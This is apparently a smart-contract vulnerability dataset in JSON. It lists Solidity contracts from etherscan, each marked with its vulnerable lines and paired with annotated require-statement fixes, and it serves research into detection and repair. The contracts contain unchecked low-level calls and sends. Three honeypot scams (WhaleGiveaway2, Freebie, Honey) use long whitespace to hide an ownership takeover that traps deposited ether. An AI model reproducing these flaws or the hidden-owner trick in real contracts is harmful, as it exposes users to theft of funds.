            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 69,71,73,75,102\n */\n\npragma solidity ^0.4.23;\n\ncontract Splitter{\n    \n\taddress public owner;\n\taddress[] public puppets;\n\tmapping (uint256 => address) public extra;\n\taddress private _addy;\n\tuint256 private _share;\n\tuint256 private _count;\n\n\n//constructor\n\n\tconstructor() payable public{\n\t\towner = msg.sender;\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\textra[0] = puppets[0];\n        extra[1] = puppets[1];\n        extra[2] = puppets[2];\n        extra[3] = puppets[3];\n\t}\n\n//withdraw (just in case)\n\t\n\tfunction withdraw() public{\n\t\trequire(msg.sender == owner);\n\t\towner.transfer(address(this).balance);\n\t}\n\n//puppet count\n\n\tfunction getPuppetCount() public constant returns(uint256 puppetCount){\n    \treturn puppets.length;\n  \t}\n\n//deploy contracts\n\n\tfunction newPuppet() public returns(address newPuppet){\n\t    require(msg.sender == owner);\n    \tPuppet p = new Puppet();\n    \tpuppets.push(p);\n    \treturn p;\n  \t\t}\n \n//update mapping\n\n    function setExtra(uint256 _id, address _newExtra) public {\n        require(_newExtra != address(0));\n        extra[_id] = _newExtra;\n    }\n\n\t\n//fund puppets TROUBLESHOOT gas\n\n    function fundPuppets() public payable {\n        require(msg.sender == owner);\n    \t_share = SafeMath.div(msg.value, 4);\n\n        extra[0].call.value(_share).gas(800000)();\n\n        extra[1].call.value(_share).gas(800000)();\n\n        extra[2].call.value(_share).gas(800000)();\n\n        extra[3].call.value(_share).gas(800000)();\n        }\n        \n//fallback function\n\nfunction() payable public{\n\t}\n}\n\n\ncontract Puppet {\n    \n    mapping (uint256 => address) public target;\n    mapping (uint256 => address) public master;\n\t\n\tconstructor() payable public{\n\t\t//target[0] = 0x42D21d1182F3aDD44064F23c1F98843D4B9fd8aa;\n\t\ttarget[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;\n        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;\n\t}\n\t\n\t//send shares to doubler\n\t//return profit to master\n\n\tfunction() public payable{\n\t    if(msg.sender != target[0]){\n\n\t\t\ttarget[0].call.value(msg.value).gas(600000)();\n\t\t}\n    }\n\t//emergency withdraw\n\n\tfunction withdraw() public{\n\t\trequire(msg.sender == master[0]);\n\t\tmaster[0].transfer(address(this).balance);\n\t}\n}\n\n\n//library\n\nlibrary SafeMath {\n\n  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    if (a == 0) {\n      return 0;\n    }\n    c = a * b;\n    assert(c / a == b);\n    return c;\n  }\n\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a / b;\n  }\n\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    c = a + b;\n    assert(c >= a);\n    return c;\n  }\n}",
            {
                "VL": [
                    70,
                    "require(extra[0]!=address(0));"
                ],
                "pre": [
                    66,
                    "require(msg.value>0);"
                ],
                "post": [
                    76,
                    "require(msg.value==SafeMath.add(SafeMath.add(SafeMath.add(_share,_share),_share),_share));"
                ]
            }
        ],
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 69,71,73,75,102\n */\n\npragma solidity ^0.4.23;\n\ncontract Splitter{\n    \n\taddress public owner;\n\taddress[] public puppets;\n\tmapping (uint256 => address) public extra;\n\taddress private _addy;\n\tuint256 private _share;\n\tuint256 private _count;\n\n\n//constructor\n\n\tconstructor() payable public{\n\t\towner = msg.sender;\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\textra[0] = puppets[0];\n        extra[1] = puppets[1];\n        extra[2] = puppets[2];\n        extra[3] = puppets[3];\n\t}\n\n//withdraw (just in case)\n\t\n\tfunction withdraw() public{\n\t\trequire(msg.sender == owner);\n\t\towner.transfer(address(this).balance);\n\t}\n\n//puppet count\n\n\tfunction getPuppetCount() public constant returns(uint256 puppetCount){\n    \treturn puppets.length;\n  \t}\n\n//deploy contracts\n\n\tfunction newPuppet() public returns(address newPuppet){\n\t    require(msg.sender == owner);\n    \tPuppet p = new Puppet();\n    \tpuppets.push(p);\n    \treturn p;\n  \t\t}\n \n//update mapping\n\n    function setExtra(uint256 _id, address _newExtra) public {\n        require(_newExtra != address(0));\n        extra[_id] = _newExtra;\n    }\n\n\t\n//fund puppets TROUBLESHOOT gas\n\n    function fundPuppets() public payable {\n        require(msg.sender == owner);\n    \t_share = SafeMath.div(msg.value, 4);\n\n        extra[0].call.value(_share).gas(800000)();\n\n        extra[1].call.value(_share).gas(800000)();\n\n        extra[2].call.value(_share).gas(800000)();\n\n        extra[3].call.value(_share).gas(800000)();\n        }\n        \n//fallback function\n\nfunction() payable public{\n\t}\n}\n\n\ncontract Puppet {\n    \n    mapping (uint256 => address) public target;\n    mapping (uint256 => address) public master;\n\t\n\tconstructor() payable public{\n\t\t//target[0] = 0x42D21d1182F3aDD44064F23c1F98843D4B9fd8aa;\n\t\ttarget[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;\n        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;\n\t}\n\t\n\t//send shares to doubler\n\t//return profit to master\n\n\tfunction() public payable{\n\t    if(msg.sender != target[0]){\n\n\t\t\ttarget[0].call.value(msg.value).gas(600000)();\n\t\t}\n    }\n\t//emergency withdraw\n\n\tfunction withdraw() public{\n\t\trequire(msg.sender == master[0]);\n\t\tmaster[0].transfer(address(this).balance);\n\t}\n}\n\n\n//library\n\nlibrary SafeMath {\n\n  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    if (a == 0) {\n      return 0;\n    }\n    c = a * b;\n    assert(c / a == b);\n    return c;\n  }\n\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a / b;\n  }\n\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    c = a + b;\n    assert(c >= a);\n    return c;\n  }\n}",
            {
                "VL": [
                    72,
                    "require(extra[1]!=address(0));"
                ],
                "pre": [
                    66,
                    "require(msg.value>0);"
                ],
                "post": [
                    76,
                    "require(msg.value==SafeMath.add(SafeMath.add(SafeMath.add(_share,_share),_share),_share));"
                ]
            }
        ],
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 69,71,73,75,102\n */\n\npragma solidity ^0.4.23;\n\ncontract Splitter{\n    \n\taddress public owner;\n\taddress[] public puppets;\n\tmapping (uint256 => address) public extra;\n\taddress private _addy;\n\tuint256 private _share;\n\tuint256 private _count;\n\n\n//constructor\n\n\tconstructor() payable public{\n\t\towner = msg.sender;\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\textra[0] = puppets[0];\n        extra[1] = puppets[1];\n        extra[2] = puppets[2];\n        extra[3] = puppets[3];\n\t}\n\n//withdraw (just in case)\n\t\n\tfunction withdraw() public{\n\t\trequire(msg.sender == owner);\n\t\towner.transfer(address(this).balance);\n\t}\n\n//puppet count\n\n\tfunction getPuppetCount() public constant returns(uint256 puppetCount){\n    \treturn puppets.length;\n  \t}\n\n//deploy contracts\n\n\tfunction newPuppet() public returns(address newPuppet){\n\t    require(msg.sender == owner);\n    \tPuppet p = new Puppet();\n    \tpuppets.push(p);\n    \treturn p;\n  \t\t}\n \n//update mapping\n\n    function setExtra(uint256 _id, address _newExtra) public {\n        require(_newExtra != address(0));\n        extra[_id] = _newExtra;\n    }\n\n\t\n//fund puppets TROUBLESHOOT gas\n\n    function fundPuppets() public payable {\n        require(msg.sender == owner);\n    \t_share = SafeMath.div(msg.value, 4);\n\n        extra[0].call.value(_share).gas(800000)();\n\n        extra[1].call.value(_share).gas(800000)();\n\n        extra[2].call.value(_share).gas(800000)();\n\n        extra[3].call.value(_share).gas(800000)();\n        }\n        \n//fallback function\n\nfunction() payable public{\n\t}\n}\n\n\ncontract Puppet {\n    \n    mapping (uint256 => address) public target;\n    mapping (uint256 => address) public master;\n\t\n\tconstructor() payable public{\n\t\t//target[0] = 0x42D21d1182F3aDD44064F23c1F98843D4B9fd8aa;\n\t\ttarget[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;\n        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;\n\t}\n\t\n\t//send shares to doubler\n\t//return profit to master\n\n\tfunction() public payable{\n\t    if(msg.sender != target[0]){\n\n\t\t\ttarget[0].call.value(msg.value).gas(600000)();\n\t\t}\n    }\n\t//emergency withdraw\n\n\tfunction withdraw() public{\n\t\trequire(msg.sender == master[0]);\n\t\tmaster[0].transfer(address(this).balance);\n\t}\n}\n\n\n//library\n\nlibrary SafeMath {\n\n  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    if (a == 0) {\n      return 0;\n    }\n    c = a * b;\n    assert(c / a == b);\n    return c;\n  }\n\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a / b;\n  }\n\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    c = a + b;\n    assert(c >= a);\n    return c;\n  }\n}",
            {
                "VL": [
                    74,
                    "require(extra[3]!=address(0));"
                ],
                "pre": [
                    66,
                    "require(msg.value>0);"
                ],
                "post": [
                    76,
                    "require(msg.value==SafeMath.add(SafeMath.add(SafeMath.add(_share,_share),_share),_share));"
                ]
            }
        ],
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 69,71,73,75,102\n */\n\npragma solidity ^0.4.23;\n\ncontract Splitter{\n    \n\taddress public owner;\n\taddress[] public puppets;\n\tmapping (uint256 => address) public extra;\n\taddress private _addy;\n\tuint256 private _share;\n\tuint256 private _count;\n\n\n//constructor\n\n\tconstructor() payable public{\n\t\towner = msg.sender;\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\tnewPuppet();\n\t\textra[0] = puppets[0];\n        extra[1] = puppets[1];\n        extra[2] = puppets[2];\n        extra[3] = puppets[3];\n\t}\n\n//withdraw (just in case)\n\t\n\tfunction withdraw() public{\n\t\trequire(msg.sender == owner);\n\t\towner.transfer(address(this).balance);\n\t}\n\n//puppet count\n\n\tfunction getPuppetCount() public constant returns(uint256 puppetCount){\n    \treturn puppets.length;\n  \t}\n\n//deploy contracts\n\n\tfunction newPuppet() public returns(address newPuppet){\n\t    require(msg.sender == owner);\n    \tPuppet p = new Puppet();\n    \tpuppets.push(p);\n    \treturn p;\n  \t\t}\n \n//update mapping\n\n    function setExtra(uint256 _id, address _newExtra) public {\n        require(_newExtra != address(0));\n        extra[_id] = _newExtra;\n    }\n\n\t\n//fund puppets TROUBLESHOOT gas\n\n    function fundPuppets() public payable {\n        require(msg.sender == owner);\n    \t_share = SafeMath.div(msg.value, 4);\n\n        extra[0].call.value(_share).gas(800000)();\n\n        extra[1].call.value(_share).gas(800000)();\n\n        extra[2].call.value(_share).gas(800000)();\n\n        extra[3].call.value(_share).gas(800000)();\n        }\n        \n//fallback function\n\nfunction() payable public{\n\t}\n}\n\n\ncontract Puppet {\n    \n    mapping (uint256 => address) public target;\n    mapping (uint256 => address) public master;\n\t\n\tconstructor() payable public{\n\t\t//target[0] = 0x42D21d1182F3aDD44064F23c1F98843D4B9fd8aa;\n\t\ttarget[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;\n        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;\n\t}\n\t\n\t//send shares to doubler\n\t//return profit to master\n\n\tfunction() public payable{\n\t    if(msg.sender != target[0]){\n\n\t\t\ttarget[0].call.value(msg.value).gas(600000)();\n\t\t}\n    }\n\t//emergency withdraw\n\n\tfunction withdraw() public{\n\t\trequire(msg.sender == master[0]);\n\t\tmaster[0].transfer(address(this).balance);\n\t}\n}\n\n\n//library\n\nlibrary SafeMath {\n\n  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    if (a == 0) {\n      return 0;\n    }\n    c = a * b;\n    assert(c / a == b);\n    return c;\n  }\n\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a / b;\n  }\n\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    c = a + b;\n    assert(c >= a);\n    return c;\n  }\n}",
            {
                "VL": [
                    101,
                    "require(msg.value>0);"
                ],
                "pre": [
                    100,
                    "require(msg.value>0);"
                ],
                "post": [
                    104,
                    "require(master[0].call.value(SafeMath.sub(msg.value,SafeMath.div(msg.value,4)))());"
                ]
            }
        ]
    ],
    "0xe894d54dca59cb53fe9cbc5155093605c7068220.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 17\n */\n\npragma solidity ^0.4.24;\n \ncontract airDrop{\n    \n    function transfer(address from,address caddress,address[] _tos,uint v, uint _decimals)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        uint _value = v * 10 ** _decimals;\n        for(uint i=0;i<_tos.length;i++){\n\n            caddress.call(id,from,_tos[i],_value);\n        }\n        return true;\n    }\n}",
            {
                "VL": [
                    16,
                    "require(caddress.call(id,from,_tos[i],_value));"
                ],
                "pre": [
                    12,
                    "require(from==msg.sender);"
                ],
                "post": [
                    20,
                    "require(false);"
                ]
            }
        ]
    ],
    "etherpot_lotto.sol": [
        [
            "/*\n * @source: https://github.com/etherpot/contract/blob/master/app/contracts/lotto.sol\n * @author: -\n * @vulnerable_at_lines: 109,141\n */\n\n//added pragma version\npragma solidity ^0.4.0;\n\n contract Lotto {\n\n     uint constant public blocksPerRound = 6800;\n     // there are an infinite number of rounds (just like a real lottery that takes place every week). `blocksPerRound` decides how many blocks each round will last. 6800 is around a day.\n\n     uint constant public ticketPrice = 100000000000000000;\n     // the cost of each ticket is .1 ether.\n\n     uint constant public blockReward = 5000000000000000000;\n\n     function getBlocksPerRound() constant returns(uint){ return blocksPerRound; }\n     function getTicketPrice() constant returns(uint){ return ticketPrice; }\n     //accessors for constants\n\n     struct Round {\n         address[] buyers;\n         uint pot;\n         uint ticketsCount;\n         mapping(uint=>bool) isCashed;\n         mapping(address=>uint) ticketsCountByBuyer;\n     }\n     mapping(uint => Round) rounds;\n     //the contract maintains a mapping of rounds. Each round maintains a list of tickets, the total amount of the pot, and whether or not the round was \"cashed\". \"Cashing\" is the act of paying out the pot to the winner.\n\n     function getRoundIndex() constant returns (uint){\n         //The round index tells us which round we're on. For example if we're on block 24, we're on round 2. Division in Solidity automatically rounds down, so we don't need to worry about decimals.\n\n         return block.number/blocksPerRound;\n     }\n\n     function getIsCashed(uint roundIndex,uint subpotIndex) constant returns (bool){\n         //Determine if a given.\n\n         return rounds[roundIndex].isCashed[subpotIndex];\n     }\n\n\n     function calculateWinner(uint roundIndex, uint subpotIndex) constant returns(address){\n         //note this function only calculates the winners. It does not do any state changes and therefore does not include various validitiy checks\n\n         var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);\n\n         if(decisionBlockNumber>block.number)\n             return;\n         //We can't decided the winner if the round isn't over yet\n\n         var decisionBlockHash = getHashOfBlock(decisionBlockNumber);\n         var winningTicketIndex = decisionBlockHash%rounds[roundIndex].ticketsCount;\n         //We perform a modulus of the blockhash to determine the winner\n\n         var ticketIndex = uint256(0);\n\n         for(var buyerIndex = 0; buyerIndex<rounds[roundIndex].buyers.length; buyerIndex++){\n             var buyer = rounds[roundIndex].buyers[buyerIndex];\n             ticketIndex+=rounds[roundIndex].ticketsCountByBuyer[buyer];\n\n             if(ticketIndex>winningTicketIndex){\n                 return buyer;\n             }\n         }\n     }\n\n     function getDecisionBlockNumber(uint roundIndex,uint subpotIndex) constant returns (uint){\n         return ((roundIndex+1)*blocksPerRound)+subpotIndex;\n     }\n\n     function getSubpotsCount(uint roundIndex) constant returns(uint){\n         var subpotsCount = rounds[roundIndex].pot/blockReward;\n\n         if(rounds[roundIndex].pot%blockReward>0)\n             subpotsCount++;\n\n         return subpotsCount;\n     }\n\n     function getSubpot(uint roundIndex) constant returns(uint){\n         return rounds[roundIndex].pot/getSubpotsCount(roundIndex);\n     }\n\n     function cash(uint roundIndex, uint subpotIndex){\n\n         var subpotsCount = getSubpotsCount(roundIndex);\n\n         if(subpotIndex>=subpotsCount)\n             return;\n\n         var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);\n\n         if(decisionBlockNumber>block.number)\n             return;\n\n         if(rounds[roundIndex].isCashed[subpotIndex])\n             return;\n         //Subpots can only be cashed once. This is to prevent double payouts\n\n         var winner = calculateWinner(roundIndex,subpotIndex);\n         var subpot = getSubpot(roundIndex);\n\n\n         winner.send(subpot);\n\n         rounds[roundIndex].isCashed[subpotIndex] = true;\n         //Mark the round as cashed\n     }\n\n     function getHashOfBlock(uint blockIndex) constant returns(uint){\n         return uint(block.blockhash(blockIndex));\n     }\n\n     function getBuyers(uint roundIndex,address buyer) constant returns (address[]){\n         return rounds[roundIndex].buyers;\n     }\n\n     function getTicketsCountByBuyer(uint roundIndex,address buyer) constant returns (uint){\n         return rounds[roundIndex].ticketsCountByBuyer[buyer];\n     }\n\n     function getPot(uint roundIndex) constant returns(uint){\n         return rounds[roundIndex].pot;\n     }\n\n     function() {\n         //this is the function that gets called when people send money to the contract.\n\n         var roundIndex = getRoundIndex();\n         var value = msg.value-(msg.value%ticketPrice);\n\n         if(value==0) return;\n\n         if(value<msg.value){\n\n             msg.sender.send(msg.value-value);\n         }\n         //no partial tickets, send a partial refund\n\n         var ticketsCount = value/ticketPrice;\n         rounds[roundIndex].ticketsCount+=ticketsCount;\n\n         if(rounds[roundIndex].ticketsCountByBuyer[msg.sender]==0){\n             var buyersLength = rounds[roundIndex].buyers.length++;\n             rounds[roundIndex].buyers[buyersLength] = msg.sender;\n         }\n\n         rounds[roundIndex].ticketsCountByBuyer[msg.sender]+=ticketsCount;\n         rounds[roundIndex].ticketsCount+=ticketsCount;\n         //keep track of the total tickets\n\n         rounds[roundIndex].pot+=value;\n         //keep track of the total pot\n\n     }\n\n }",
            {
                "VL": [
                    108,
                    "require(winner!=0);"
                ],
                "pre": [
                    90,
                    "require(msg.sender==calculateWinner(roundIndex,subpotIndex));"
                ],
                "post": [
                    113,
                    "require(rounds[roundIndex].isCashed[subpotIndex]);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/etherpot/contract/blob/master/app/contracts/lotto.sol\n * @author: -\n * @vulnerable_at_lines: 109,141\n */\n\n//added pragma version\npragma solidity ^0.4.0;\n\n contract Lotto {\n\n     uint constant public blocksPerRound = 6800;\n     // there are an infinite number of rounds (just like a real lottery that takes place every week). `blocksPerRound` decides how many blocks each round will last. 6800 is around a day.\n\n     uint constant public ticketPrice = 100000000000000000;\n     // the cost of each ticket is .1 ether.\n\n     uint constant public blockReward = 5000000000000000000;\n\n     function getBlocksPerRound() constant returns(uint){ return blocksPerRound; }\n     function getTicketPrice() constant returns(uint){ return ticketPrice; }\n     //accessors for constants\n\n     struct Round {\n         address[] buyers;\n         uint pot;\n         uint ticketsCount;\n         mapping(uint=>bool) isCashed;\n         mapping(address=>uint) ticketsCountByBuyer;\n     }\n     mapping(uint => Round) rounds;\n     //the contract maintains a mapping of rounds. Each round maintains a list of tickets, the total amount of the pot, and whether or not the round was \"cashed\". \"Cashing\" is the act of paying out the pot to the winner.\n\n     function getRoundIndex() constant returns (uint){\n         //The round index tells us which round we're on. For example if we're on block 24, we're on round 2. Division in Solidity automatically rounds down, so we don't need to worry about decimals.\n\n         return block.number/blocksPerRound;\n     }\n\n     function getIsCashed(uint roundIndex,uint subpotIndex) constant returns (bool){\n         //Determine if a given.\n\n         return rounds[roundIndex].isCashed[subpotIndex];\n     }\n\n\n     function calculateWinner(uint roundIndex, uint subpotIndex) constant returns(address){\n         //note this function only calculates the winners. It does not do any state changes and therefore does not include various validitiy checks\n\n         var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);\n\n         if(decisionBlockNumber>block.number)\n             return;\n         //We can't decided the winner if the round isn't over yet\n\n         var decisionBlockHash = getHashOfBlock(decisionBlockNumber);\n         var winningTicketIndex = decisionBlockHash%rounds[roundIndex].ticketsCount;\n         //We perform a modulus of the blockhash to determine the winner\n\n         var ticketIndex = uint256(0);\n\n         for(var buyerIndex = 0; buyerIndex<rounds[roundIndex].buyers.length; buyerIndex++){\n             var buyer = rounds[roundIndex].buyers[buyerIndex];\n             ticketIndex+=rounds[roundIndex].ticketsCountByBuyer[buyer];\n\n             if(ticketIndex>winningTicketIndex){\n                 return buyer;\n             }\n         }\n     }\n\n     function getDecisionBlockNumber(uint roundIndex,uint subpotIndex) constant returns (uint){\n         return ((roundIndex+1)*blocksPerRound)+subpotIndex;\n     }\n\n     function getSubpotsCount(uint roundIndex) constant returns(uint){\n         var subpotsCount = rounds[roundIndex].pot/blockReward;\n\n         if(rounds[roundIndex].pot%blockReward>0)\n             subpotsCount++;\n\n         return subpotsCount;\n     }\n\n     function getSubpot(uint roundIndex) constant returns(uint){\n         return rounds[roundIndex].pot/getSubpotsCount(roundIndex);\n     }\n\n     function cash(uint roundIndex, uint subpotIndex){\n\n         var subpotsCount = getSubpotsCount(roundIndex);\n\n         if(subpotIndex>=subpotsCount)\n             return;\n\n         var decisionBlockNumber = getDecisionBlockNumber(roundIndex,subpotIndex);\n\n         if(decisionBlockNumber>block.number)\n             return;\n\n         if(rounds[roundIndex].isCashed[subpotIndex])\n             return;\n         //Subpots can only be cashed once. This is to prevent double payouts\n\n         var winner = calculateWinner(roundIndex,subpotIndex);\n         var subpot = getSubpot(roundIndex);\n\n\n         winner.send(subpot);\n\n         rounds[roundIndex].isCashed[subpotIndex] = true;\n         //Mark the round as cashed\n     }\n\n     function getHashOfBlock(uint blockIndex) constant returns(uint){\n         return uint(block.blockhash(blockIndex));\n     }\n\n     function getBuyers(uint roundIndex,address buyer) constant returns (address[]){\n         return rounds[roundIndex].buyers;\n     }\n\n     function getTicketsCountByBuyer(uint roundIndex,address buyer) constant returns (uint){\n         return rounds[roundIndex].ticketsCountByBuyer[buyer];\n     }\n\n     function getPot(uint roundIndex) constant returns(uint){\n         return rounds[roundIndex].pot;\n     }\n\n     function() {\n         //this is the function that gets called when people send money to the contract.\n\n         var roundIndex = getRoundIndex();\n         var value = msg.value-(msg.value%ticketPrice);\n\n         if(value==0) return;\n\n         if(value<msg.value){\n\n             msg.sender.send(msg.value-value);\n         }\n         //no partial tickets, send a partial refund\n\n         var ticketsCount = value/ticketPrice;\n         rounds[roundIndex].ticketsCount+=ticketsCount;\n\n         if(rounds[roundIndex].ticketsCountByBuyer[msg.sender]==0){\n             var buyersLength = rounds[roundIndex].buyers.length++;\n             rounds[roundIndex].buyers[buyersLength] = msg.sender;\n         }\n\n         rounds[roundIndex].ticketsCountByBuyer[msg.sender]+=ticketsCount;\n         rounds[roundIndex].ticketsCount+=ticketsCount;\n         //keep track of the total tickets\n\n         rounds[roundIndex].pot+=value;\n         //keep track of the total pot\n\n     }\n\n }",
            {
                "VL": [
                    140,
                    "require(false);"
                ],
                "pre": [
                    140,
                    "require(false);"
                ],
                "post": [
                    142,
                    "require(false);"
                ]
            }
        ]
    ],
    "0x3f2ef511aa6e75231e4deafc7a3d2ecab3741de2.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 45\n */\n\npragma solidity ^0.4.19;\n\ncontract WhaleGiveaway2\n{\n    address public Owner = msg.sender;\n    uint constant public minEligibility = 0.999001 ether; \n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function redeem()\n    public\n    payable\n    {                                                                    \n        if(msg.value>=minEligibility)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b){Owner=0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);\n    }\n}",
            {
                "VL": [
                    44,
                    "require(msg.value>=0);"
                ],
                "pre": [
                    43,
                    "require(msg.value>=0.001ether);"
                ],
                "post": [
                    46,
                    "require(adr.balance>=msg.value);"
                ]
            }
        ]
    ],
    "0xe82f0742a71a02b9e9ffc142fdcb6eb1ed06fb87.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 39\n */\n\npragma solidity ^0.4.19;\n\ncontract Freebie\n{\n    address public Owner = msg.sender;\n   \n    function() public payable{}\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x30ad12df80a2493a82DdFE367d866616db8a2595){Owner=0x30ad12df80a2493a82DdFE367d866616db8a2595;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);\n    }\n}",
            {
                "VL": [
                    38,
                    "require(msg.value>0);"
                ],
                "pre": [
                    37,
                    "require(msg.value>0);"
                ],
                "post": [
                    40,
                    "require(adr.call.value(msg.value)(data));"
                ]
            }
        ]
    ],
    "0xe4eabdca81e31d9acbc4af76b30f532b6ed7f3bf.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 44\n */\n\npragma solidity ^0.4.19;\n\ncontract Honey\n{\n    address public Owner = msg.sender;\n   \n    function()\n    public\n    payable\n    {\n        \n    }\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           \n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){Owner=0x0C76802158F13aBa9D892EE066233827424c5aAB;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  \n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);\n    }\n}",
            {
                "VL": [
                    43,
                    "require(msg.value>0);"
                ],
                "pre": [
                    42,
                    "require(msg.value>0);"
                ],
                "post": [
                    45,
                    "require(adr.balance>=msg.value);"
                ]
            }
        ]
    ],
    "0x3e013fc32a54c4c5b6991ba539dcd0ec4355c859.sol": [
        [
